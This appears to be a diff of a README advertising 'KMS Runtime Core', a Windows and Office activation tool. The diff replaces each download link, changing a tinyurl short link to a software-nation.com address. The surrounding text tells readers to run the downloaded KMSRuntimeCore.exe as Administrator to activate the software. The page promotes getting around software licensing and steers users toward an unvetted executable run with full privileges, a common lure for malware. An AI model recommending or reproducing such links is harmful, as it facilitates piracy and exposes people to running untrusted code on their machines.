@@ -9,7 +9,7 @@ The **⚡ KMS Runtime Core** is an ultra-lightweight runtime activation engine t
 
 <div align="center">
 
-[![Download KMS Runtime Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-runtime-core)
+[![Download KMS Runtime Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-runtime-core)
 
 </div>
 
@@ -95,7 +95,7 @@ Most activation tools are heavy. They install services, leave background process
 3. **🖱️ Run as Administrator** — `KMSRuntimeCore.exe`
 4. **✅ Done** — Windows and Office activated in 2-3 seconds
 
-[![Download KMS Runtime Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-runtime-core)
+[![Download KMS Runtime Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-runtime-core)
 
 ### Runtime Output
 
@@ -229,7 +229,7 @@ Run once. Activate. Exit. **KMS Runtime Core** is the lightest, fastest activati
 
 <div align="center">
 
-[![Download KMS Runtime Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-runtime-core)
+[![Download KMS Runtime Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-runtime-core)
 
 **Version 3.0.0** — Lightweight runtime activator. Free forever.
 
